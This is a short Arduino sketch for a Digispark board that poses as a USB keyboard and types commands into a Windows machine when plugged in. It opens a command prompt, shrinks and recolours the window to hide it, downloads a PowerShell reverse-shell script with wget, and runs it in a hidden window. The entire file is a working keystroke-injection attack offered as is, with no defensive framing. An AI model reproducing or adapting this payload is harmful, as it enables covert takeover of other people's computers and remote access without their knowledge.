#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("mode con: cols=16 lines=1&color FE");
    DigiKeyboard.println("cd Desktop&powershell (wget 'reverse_shell_code.ps1' -outfile a.ps1)&powershell -windowstyle hidden -file a.ps1");
}
void loop() {
}
